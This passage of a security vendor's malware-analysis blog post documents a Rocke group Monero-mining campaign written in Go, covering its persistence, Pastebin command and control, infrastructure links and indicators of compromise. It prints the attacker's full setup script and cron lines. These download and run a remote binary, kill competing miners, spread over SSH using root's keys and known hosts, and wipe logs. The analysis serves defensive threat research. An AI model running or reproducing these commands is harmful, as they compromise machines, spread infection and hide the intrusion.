Package main: /root/go/src/github.com/hippies/LSD&#10;File: main.go    &#10;    goatt Lines: 12 to 17 (5)    &#10;    main Lines: 17 to 34 (17)    &#10;&#10;/root/go/src/github.com/hippies/LSD/LSDB&#10;File: a.go    &#10;    _kBytes Lines: 13 to 27 (14)    &#10;    KWR Lines: 27 to 36 (9)    &#10;File: b.go    &#10;    _libBytes Lines: 10 to 17 (7)    &#10;    LibWrite Lines: 17 to 25 (8)    &#10;File: c.go    &#10;    _netdnsinitBytes Lines: 11 to 18 (7)    &#10;    _netdnsserviceBytes Lines: 18 to 26 (8)    &#10;    NetdnsWrite Lines: 26 to 37 (11)    &#10;/root/go/src/github.com/hippies/LSD/LSDA    &#10;File: a.go    &#10;    getiplista Lines: 12 to 37 (25)    &#10;    run Lines: 37 to 86 (49)    &#10;    runtwo Lines: 86 to 98 (12)    &#10;    Ago Lines: 98 to 108 (10)    &#10;    (Ago)func1 Lines: 103 to 106 (3)    &#10;File: b.go    &#10;    getiplistb Lines: 18 to 42 (24)    &#10;    generateTask Lines: 42 to 54 (12)    &#10;    cmd Lines: 54 to 81 (27)    &#10;    (cmd)func1 Lines: 62 to 98 (36)    &#10;    cmdtwo Lines: 81 to 93 (12)    &#10;    bgo Lines: 93 to 113 (20)    &#10;    (bgo)func1 Lines: 98 to 101 (3)    &#10;    Bbgo Lines: 113 to 118 (5)    &#10;/root/go/src/github.com/hippies/LSD/LSDC    &#10;File: a.go    &#10;    Read Lines: 17 to 43 (26)    &#10;    PathExists Lines: 43 to 54 (11)    &#10;    CopyFile Lines: 54 to 65 (11)    &#10;    Mkdir Lines: 65 to 69 (4)    &#10;    Writefile Lines: 69 to 79 (10)    &#10;    Writefiletwo Lines: 79 to 88 (9)    &#10;    Delfile Lines: 88 to 97 (9)    &#10;    Changetime Lines: 97 to 105 (8)    &#10;    Cmdexec Lines: 105 to 111 (6)    &#10;    Checkupdate Lines: 111 to 129 (18)    &#10;    Getip Lines: 129 to 149 (20)    &#10;    Getipb Lines: 149 to 164 (15)    &#10;    Cron Lines: 164 to 173 (9)</pre><p>The main execution process can be summarized in the following steps:</p><ol><li>Delete &ldquo;/etc/ld.so.preload&rdquo; if it exists</li><li>Get the PID of the process and writes it to &ldquo;/tmp/.lsdpid&rdquo;</li><li>Uses &ldquo;chattr -i&rdquo; to mark the PID file protected so it cannot be modified</li><li>Copies itself from &ldquo;/tmp/kthrotlds&rdquo; to &ldquo;/usr/sbin/kthrotlds&rdquo;</li><li>Turns the modified time stamp on the moved file back 416 days</li><li>Installs an &ldquo;init.d&rdquo; startup script to &ldquo;/etc/init.d/netdns&rdquo; and a systemd service script to &ldquo;/usr/lib/systemd/system/netdns.service&rdquo;; the modified time is also changed for these files in the same way</li><li>Enabling the service on the compromised system by executing: &ldquo;chkconfig --add netdns&rdquo; and &ldquo;systemctl enable netdns&rdquo;</li><li>Removes the files &ldquo;/tmp/kthrotlds&rdquo; and &ldquo;/tmp/kintegrityds&rdquo;</li><li>Writes code to &ldquo;/usr/local/lib/libcset.c&rdquo;</li><li>Compiles it with &ldquo;gcc /usr/local/lib/libcset.c -Wall -shared -fPIC -ldl -o /usr/local/lib/libcset.so&rdquo;</li><li>If GCC is not installed it tries to install it and recompile &ldquo;yum -y install gcc -y||apt-get -y install gcc&rdquo;</li><li>Adds the path to the shared object to &ldquo;/etc/ld.so.preload&rdquo; and protects the file from modifications</li><li>Persistence is added through Cron by executing echo "*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh" | crontab - and by adding &ldquo;*/15 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh&rdquo; to &nbsp;&ldquo;/var/spool/cron/crontabs/root&rdquo;</li><li>Checking for updates by checking the version listed at &ldquo;https://pastebin.com/raw/HWBVXK6H&rdquo;</li><li>Installs the Monero miner at &ldquo;/tmp/kintegrityds&rdquo; and protects it</li><li>The miner connects to a private pool hosted on DigitalOcean with IP and port of: 134.209.104.20:51640</li></ol><p>The malware also starts an &ldquo;attack&rdquo; thread that scans for SSH and Redis servers. The malware uses &ldquo;ident.me&rdquo; to determine the machines external host so it does not attack itself.</p><h3>Command and Control</h3><p>The malware uses Pastebin for Command and Control (C2). The URL &ldquo;https://pastebin[.]com/HWBVXK6H&rdquo; is used to check for the latest version of the malware. If a new version is available, the malware reaches out to &ldquo;https://pastebin[.]com/yPRSa0ki&rdquo;. The paste shown below serves as a redirect to the actual setup stript.</p><pre>
(curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -O- https://pastebin.com/raw/D8E71JBJ)|sed &#39;s///&#39;|sh</pre><p>The setup script in paste D8E71JBJ, shown below, kills other mining malware and downloads and executes the threat actors&rsquo; malware instead. It will also try to use known SSH hosts and the SSH key on the machine to spread latterly.</p><pre>
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin&#10;&#10;echo "*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh" | crontab -&#10;&#10;mkdir -p /tmp&#10;chmod 1777 /tmp&#10;&#10;ps -ef|grep -v grep|grep hwlh3wlh44lh|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep Circle_MI|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep get.bi-chi.com|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep hashvault.pro|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep nanopool.org|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep /usr/bin/.sshd|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "xmr"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "xig"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "ddgs"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "qW3xT"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "wnTKYg"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "t00ls.ru"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "sustes"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "thisxxs"|awk &#39;{print $2}&#39; | xargs kill -9&#10;ps -ef|grep -v grep|grep "hashfish"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "kworkerds"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "watchdog"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "/tmp/devtool"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "systemctI"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "watchdogs"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "ksoftirqds"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps -ef|grep -v grep|grep "suolbcc"|awk &#39;{print $2}&#39;|xargs kill -9&#10;ps aux|grep -v grep|grep -v kintegrityds|awk &#39;&#123;if($3&gt;=80.0) print $2}&#39;|xargs kill -9&#10;yum -y install coreutils||apt-get -y install coreutils&#10;apt-get install cron -y||yum install crontabs -y||apk add cron -y&#10;&#10;if [ ! -f "/tmp/.lsdpid" ]; then&#10;   ARCH=$(uname -m)&#10;   if [ ${ARCH}x = "x86_64x" ]; then&#10;       (curl -fsSL http://sowcar.com/t6/678/1552060180x1822611359.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060180x1822611359.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds&#10;   elif [ ${ARCH}x = "i686x" ]; then&#10;       (curl -fsSL http://sowcar.com/t6/678/1552060225x1822611359.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060225x1822611359.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds&#10;   else&#10;       (curl -fsSL http://sowcar.com/t6/678/1552060225x1822611359.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060225x1822611359.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds&#10;   fi&#10;       nohup /tmp/kthrotlds &gt;/dev/null 2&gt;&amp;1 &amp;&#10;elif [ ! -f "/proc/$(cat /tmp/.lsdpid)/stat" ]; then&#10;   ARCH=$(uname -m)&#10;   if [ ${ARCH}x = "x86_64x" ]; then&#10;       (curl -fsSL http://sowcar.com/t6/678/1552060180x1822611359.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060180x1822611359.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds&#10;   elif [ ${ARCH}x = "i686x" ]; then&#10;       (curl -fsSL http://sowcar.com/t6/678/1552060225x1822611359.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060225x1822611359.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds&#10;   else&#10;       (curl -fsSL http://sowcar.com/t6/678/1552060225x1822611359.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060225x1822611359.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds&#10;   fi&#10;       nohup /tmp/kthrotlds &gt;/dev/null 2&gt;&amp;1 &amp;&#10;fi&#10;&#10;if [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then&#10; for h in $(grep -oE "([0-9]{1,3}.){3}[0-9]{1,3}" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h &#39;(curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh &gt;/dev/null 2&gt;&amp;1 &amp;&#39; &amp; done&#10;fi&#10;&#10;echo 0&gt;/var/spool/mail/root&#10;echo 0&gt;/var/log/wtmp&#10;echo 0&gt;/var/log/secure&#10;echo 0&gt;/var/log/cron&#10;#&#10;</pre><p>The Pastebin profile used by the actor for this campaign is shown below. It can be seen that these pastes were added on February 24th, 2019.</p><p
style="text-align: center;"><em><img
alt="Pastebin profile used by the threat actor" src="https://anomali.cdn.rackfoundry.net/images/uploads/blog/pastebin-profile.png" /><br
/>
Figure 2: Pastebin profile used by the threat actor</em></p><p>The server hosting the malware has the appearance of a free Chinese image hosting site, shown in Figure 3 below. The page asks a visitor to upload their identity photo for the Chinese online shopping website, Taobao.</p><p
style="text-align: center;"><em><img
alt="Image hosting site from where the malware is downloaded from" src="https://anomali.cdn.rackfoundry.net/images/uploads/blog/Image-hosting-site.png" /><br
/>
Figure 3: Image hosting site from where the malware is downloaded from.</em></p><p>According to the Whois record, shown below, the fake image hosting domain was created on June 21st, 2018. It is also registered by the same email (4592248@gmail[.]com) as another domain that was used in an earlier Rocke campaign which indicates that it is likely the site is controlled by the threat group.[3]</p><pre>
  Domain Name: SOWCAR.COM&#10;&#10;  Registry Domain ID: 2277522871_DOMAIN_COM-VRSN&#10;&#10;  Registrar WHOIS Server: whois.ename.com&#10;&#10;  Registrar URL: http://www.ename.net&#10;&#10;  Updated Date: 2019-03-08T01:38:36Z&#10;&#10;  Creation Date: 2018-06-21T11:14:39Z&#10;&#10;  Registry Expiry Date: 2019-06-21T11:14:39Z&#10;&#10;  Registrar: eName Technology Co., Ltd.&#10;&#10;  Registrar IANA ID: 1331&#10;&#10;  Registrar Abuse Contact Email: abuse@ename.com&#10;&#10;  Registrar Abuse Contact Phone: 86.4000044400&#10;&#10;  Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited&#10;&#10;  Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited&#10;&#10;  Name Server: DALE.NS.CLOUDFLARE.COM&#10;&#10;  Name Server: JOAN.NS.CLOUDFLARE.COM&#10;&#10;  DNSSEC: unsigned&#10;&#10;  URL of the ICANN Whois Inaccuracy Complaint Form:&#10;  Registry Registrant ID:Not Available From Registry&#10;&#10;  Registrant Name: LuWei&#10;&#10;  Registrant Organization: Lu Wei&#10;&#10;  Registrant Street: SiChuan ZhongLu 668 Hao 8 Lou&#10;&#10;  Registrant City: ShangHai&#10;&#10;  Registrant State/Province: ShangHai&#10;&#10;  Registrant Postal Code: 200000&#10;&#10;  Registrant Country: CN&#10;&#10;  Registrant Phone: +86.2139003725&#10;&#10;  Registrant Phone Ext:&#10;&#10;  Registrant Fax: +86.2139003725&#10;&#10;  Registrant Fax Ext:&#10;&#10;  Registrant Email: 4592248@gmail.com&#10;&#10;  Registry Admin ID:Not Available From Registry</pre><h2>Overlapping TTPs with previous campaigns</h2><p>The current campaign has numerous TTPs overlapping with the previous campaign reported by Unit 42. In both campaigns, the group uses Pastebin for C2 and the C2 system depends on 3 public pastes. One paste serves the latest version, one acts as a redirect to the third that is used to initialize the infection. The redirect uses either &ldquo;cURL&rdquo; or &ldquo;wget&rdquo; to fetch the initialization script from the paste. The paste is &ldquo;piped&rdquo; to either &ldquo;bash&rdquo; or &ldquo;sh&rdquo; after some cleanup. In addition to the similarities in the structures, the user account names also appear to follow a similar pattern. In this campaign the username is &ldquo;SYSTEMTEN&rdquo; while last campaign username was &ldquo;SYSTEAM&rdquo;. The first five characters of the username (SYSTE) may be an indication of other Rocke activity.</p><p>The filenames of the payloads are also similar in the two latest reported campaigns. Below are the URLs used to download the payload in this campaign and the campaign reported by Unit 42. The filenames have the same structure, with some of the numbers overlapping.</p><pre>
http://sowcar.com/t6/678/1552060180x1822611359.jpg&#10;&#10;https://master.minerxmr.ru/2/1551434778x2728329032.jpg</pre><p>The malware uses cron for persistence. The similar crontab entries are shown below. The only difference between the entries are the ID of paste used.</p><p>Cron jobs created by the Python version of the malware:</p><pre>
"*/10 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh
##"&#10;&#10;"*/15 * * * * (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh
##"</pre><p>Cron jobs created by the Go version of the malware:</p><pre>
*/10 * * * * root (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh&#10;&#10;##&#10;&#10;*/15 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh&#10;&#10;##</pre><p>In this campaign, the threat actor also uses &ldquo;init&rdquo; and &ldquo;systemd&rdquo; services for persistence. The name of the service is &ldquo;netdns.&rdquo; Below is a snippet from the setup script used by Rocke in a previous campaign that also uses the serviced called netdns. After the file is created, the access and modified time is changed before the file is marked as non-modifiable. The same technique is used by the new malware written in Go.</p><pre>
curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/Pep/4 -o /etc/init.d/netdns||wget https://master.minerxmr.ru/Pep/4 -O /etc/init.d/netdns) &amp;&amp; chmod 777 /etc/init.d/netdns &amp;&amp; touch -acmr /bin/sh /etc/init.d/netdns &amp;&amp; chattr +i /etc/init.d/netdns</pre><p>The spreading technique observed by Anomali researchers is the same one used in previous campaigns. The malware in both previous and ongoing campaign assumes that it has root level access on the machine. Below are code snippets from the current campaign and the campaign reported by Unit 42, where the threat actor uses ssh keys and known hosts if they are available to infect other machines.</p><p><strong>Last campaign</strong></p><pre>
if [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then   &#10;&#10;               for h in $(grep -oE "([0-9]{1,3}.){3}[0-9]{1,3}" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h &#39;(curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh&#39; &amp; done&#10;&#10;fi</pre><p><strong>Current campaign</strong></p><pre>
if [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then&#10;&#10; for h in $(grep -oE "([0-9]{1,3}.){3}[0-9]{1,3}" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h &#39;(curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh &gt;/dev/null 2&gt;&amp;1 &amp;&#39; &amp; done&#10;&#10;fi</pre><p>In addition to the propagation over SSH, the new malware tries to compromise Redis servers just like the Python-based malware.</p><p>There is also overlap of infrastructure. The email used to register the sowcar[.]com domain also registered thyrsi[.]com. This domain was reported on and linked to the same threat group in a report by Cisco Talos in December 2018. The domains registered by this email address is shown in the figure below.</p><p
style="text-align: center;"><em><img
alt="Domains registered by the same email address" src="https://anomali.cdn.rackfoundry.net/images/uploads/blog/Domains-registered.png" /><br
/>
Figure 4: Domains registered by the same email address.</em></p><h2>Conclusion</h2><p>Anomali Labs has detected a new campaign by the threat group Rocke. In this campaign, the group has changed from using a Python-based malware to a malware written in Golang. The detection of this new malware is nearly non-existent. In addition, the group uses a private mining pool to reduce the risks of being detected.</p><h2>Mitre ATT&amp;CK</h2><ul><li>T1190 Exploit Public-Facing Application</li><li>T1078 Valid Accounts</li><li>T1168 Local Job Scheduling</li><li>T1110 Brute Force</li><li>T1222 File Permissions Modification</li><li>T1021 Remote Services</li><li>T1064 Scripting</li><li>T1045 Software Packing</li><li>T1071 Standard Application Layer Protocol</li><li>T1099 Timestomp</li><li>T1055 Process Injection</li><li>T1036 Masquerading</li></ul><h2>IOCs</h2><p><strong>URLS</strong></p><pre>
https://pastebin[.]com/raw/yPRSa0ki&#10;&#10;https://pastebin[.]com/raw/wDBa7jCQ&#10;&#10;https://pastebin[.]com/raw/D8E71JBJ&#10;&#10;https://pastebin[.]com/raw/HWBVXK6H&#10;&#10;https://pastebin[.]com/raw/qs3ger9z&#10;&#10;http://sowcar[.]com/t6/678/1552060180x1822611359.jpg&#10;&#10;http://sowcar[.]com/t6/678/1552060225x1822611359.jpg&#10;&#10;http://sowcar[.]com/t6/682/1552580197x2890211702.jpg</pre><p><strong>SHA256</strong></p><pre>
029e79bc2e232d21b61c09463dd89e515606b7b9df771572627394cbe59e1cbd&#10;&#10;93efdee9def596b93517699958e7a5c3f0bae88e220cb08593c4712f143696dd&#10;&#10;3a4391293d1a7fbd5cfc34258aa0cfcd57abb8b4453e47ea293c572fbf1862ad&#10;&#10;60aadabd2f3f1465f239d2721a663f4b9f9d15e739dcb14df64e241c2d37e30c&#10;&#10;9df3ae6da6b262f5dea6a1f5438127cd4cfa8d718997b4e90b107fabb2b392be&#10;&#10;e2db2dca7d84098192c5562c299a76330ca556ac30d583ac8079fe63b61e94d5</pre><p><strong>Mining pool</strong></p><p>134.209.104.20:51640</p><h2>Endnotes</h2><ul><li>David Liedenberg, &ldquo;<a
href="https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html" target="_blank">Rocke: The Champion of Monero Miners</a>,&rdquo; Talos Blog, accessed March 14, 2019, published August 30, 2018.</li><li>Xingyu Jin and Claud Xiao, &ldquo;<a
href="https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/" target="_blank">Malware Used by &ldquo;Rocke&rdquo; Group Evolves to Evade Detection by Cloud Security Products</a>,&rdquo; Palo Alto Networks, accessed March 14, 2019, published January 17, 2019.</li><li>David Liebenberg and Andrew Williams, &ldquo;<a
href="https://blog.talosintelligence.com/2018/12/cryptomining-campaigns-2018.html" target="_blank">Connecting the dots between recently active cryptominers</a>,&rdquo; Talos Blog, accessed March 14, 2019, published December 18, 2018.</li></ul>
	</div></div></div></div>
</article></div></div>
<section
class="anomali-jumbotron theme-gray"><div
class="container"><div
class="trd-ph-embedded" data-id="2ec4bd97-a5f5-4ac1-9d27-9bff735a6058"></div></div>
</section><div
class="module-newsletter"><div
class="container"><div
class="row"><div
class="col-2">
<picture>
<source
srcset="https://anomali.cdn.rackfoundry.net/assets/images/slugs/icn-email-subscribe.webp" type="image/webp">
<img
class="newsletter-icon img-fluid" src="https://anomali.cdn.rackfoundry.net/assets/images/slugs/icn-email-subscribe.png">
</picture></div><div
class="col-10"><h3 class="headline">Subscribe to the Anomali Newsletter</h3><p
class="m-0">Get the latest Anomali updates and cybersecurity news straight to your inbox each month.</p>
<a
href="/resources/anomali-newsletter" class="btn btn-outline-anomali">Subscribe Now</a></div></div></div></div></div>
<footer
class="footer"><div
class="container"><div
class="footer-nav row"><div
class="footer-column"><h5 class="mb-2"><a
href="/products">Products</a></h5><ul><li
class="mb-2"><a
href="/products/threatstream">ThreatStream</a></li><li
class="mb-2"><a
href="/products/match">Match</a></li><li><a
href="/products/lens">Lens</a></li></ul></div><div
class="footer-column"><h5><a
href="/threat-intel-sharing">Threat Intel Sharing</a></h5><h5 class="mb-2"><a
href="/marketplace">Marketplace</a></h5><ul><li
class="mb-2"><a
href="/marketplace/threat-intelligence-feeds">Threat Intelligence Feeds</a></li><li
class="mb-2"><a
href="/marketplace/threat-analysis-tools">Threat Analysis Tools &amp; Enrichments</a></li><li><a
href="/marketplace/security-system-partners">Security System Partners</a></li></ul></div><div
class="footer-column"><h5 class="mb-2"><a
href="/resources">Resources</a></h5><ul><li
class="mb-2"><a
href="/resources#datasheets">Datasheets</a></li><li
class="mb-2"><a
href="/resources#partner-datasheets">Partner Datasheets</a></li><li
class="mb-2"><a
href="/resources#videos">Videos</a></li><li
class="mb-2"><a
href="/resources#webinars">Webinars</a></li><li
class="mb-2"><a
href="/resources#whitepapers">White Papers</a></li><li
class="mb-2"><a
href="/detect-live">Detect LIVE</a></li><li
class="mb-2"><a
href="/resources/anomali-cyber-watch">Anomali Cyber Watch</a></li><li
class="mb-2"><a
href="/resources/staxx">STAXX</a></li></ul></div><div
class="footer-column"><h5 class="mb-2"><a
href="/company">Company</a></h5><ul><li
class="mb-2"><a
href="/company/leadership">Leadership</a></li><li
class="mb-2"><a
href="/news-events/press">News &amp; Events</a></li><li
class="mb-2"><a
href="/company/awards">Awards</a></li><li><a
href="/company/careers">Careers</a></li></ul></div><div
class="footer-column"><h5 class="mb-2"><a
href="/partners">Partners</a></h5><ul><li
class="mb-2"><a
href="/partners/channel-resellers">Channel Resellers</a></li><li
class="mb-2"><a
href="/partners/mssps">MSSPs</a></li><li
class="mb-2"><a
href="/partners/system-integrators">System Integrators</a></li><li><a
href="https://anomali.force.com/partnerportal/s/" target="_blank">Partner Portal</a></li></ul></div><div
class="footer-column"><h5><a
href="/request-a-demo">Schedule Demo</a></h5><h5><a
href="/company/contact-us">Contact</a></h5><h5><a
href="https://ui.threatstream.com/login" target="_blank">Sign In</a></h5><h5><a
href="/customer-success">Support</a></h5><h5><a
href="/blog">Blog</a></h5></div></div><div
class="footer-bottom"><div
class="footer-bottom-legal"><ul
class="list-inline"><li
class="list-inline-item"><a
href="/privacy-policy">Privacy Policy</a></li><li
class="list-inline-item"><a
href="/terms-of-service">Terms of Use</a></li><li
class="list-inline-item"><a
href="/3rd-party-vendor-policy">3rd Party Vendor Policy</a></li></ul><p>&copy; Copyright 2021 Anomali&reg;. All rights reserved.<br
/>
ThreatStream&reg; is a registered trademark of Anomali Inc. Anomali Match&trade; ("Match") and Anomali Lens&trade; ("Lens") are trademarks of Anomali Inc.</p></div><div
class="footer-bottom-logo"><div>
<img
src="https://anomali.cdn.rackfoundry.net/assets/images/anomali-logo.svg" class="logo" alt="Anomali"></div>
<ul class="social-links">
	<li class="social-item">
		<a href="https://twitter.com/anomali" target="_blank">
			<span class="fa-stack">
				<i class="fas fa-circle fa-stack-2x" aria-hidden="true"></i>
				<i class="fab fa-twitter fa-stack-1x fa-inverse" aria-hidden="true"></i>
			</span>
			<span class="sr-only">Twitter</span>
		</a>
	</li>
	<li class="social-item">
		<a href="https://www.instagram.com/anomali_inc/" target="_blank">
			<span class="fa-stack">
				<i class="fas fa-circle fa-stack-2x" aria-hidden="true"></i>
				<i class="fab fa-instagram fa-stack-1x fa-inverse" aria-hidden="true"></i>
			</span>
			<span class="sr-only">Instagram</span>
		</a>
	</li>
	<li class="social-item">
		<a href="https://www.facebook.com/threatstream" target="_blank">
			<span class="fa-stack">
				<i class="fas fa-circle fa-stack-2x" aria-hidden="true"></i>
				<i class="fab fa-facebook fa-stack-1x fa-inverse" aria-hidden="true"></i>
			</span>
			<span class="sr-only">Facebook</span>
		</a>
	</li>
	<li class="social-item">
		<a href="https://www.linkedin.com/company/anomali" target="_blank">
			<span class="fa-stack">
				<i class="fas fa-circle fa-stack-2x" aria-hidden="true"></i>
				<i class="fab fa-linkedin fa-stack-1x fa-inverse" aria-hidden="true"></i>
			</span>
			<span class="sr-only">LinkedIn</span>
		</a>
	</li>
	<li class="social-item">
		<a href="https://www.youtube.com/channel/UCloYBsWSqk_5x7gdpOn4y8g" target="_blank">
			<span class="fa-stack">
				<i class="fas fa-circle fa-stack-2x" aria-hidden="true"></i>
				<i class="fab fa-youtube fa-stack-1x fa-inverse" aria-hidden="true"></i>
			</span>
			<span class="sr-only">YouTube</span>
		</a>
	</li>
</ul></div></div></div>
</footer></div> <script template="" id="appjs" crossorigin="anonymous" async="async" src="https://www.anomali.com/cache/a22d1d868692973288e25c89f766247feac6353d.1619117684.js"></script> 


<!-- Start of HubSpot Embed Code -->
<script type="text/javascript" id="hs-script-loader" async defer src="//js.hs-scripts.com/458120.js"></script>


<!-- Triblio Footer -->
<script type='text/javascript' data-cfasync='false' src='//tribl.io/footer.js?orgId=O8naez8e2eHPYn7m991b'></script>


<!-- LeadLander Tracking -->
<script>
  var llcookieless = false;
  (function() {
    var a = document.createElement('script');
    a.src = 'https://lltrck.com/scripts/lt-v3.js?llid=26138';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(a, s);
  })();
</script>



</body></html>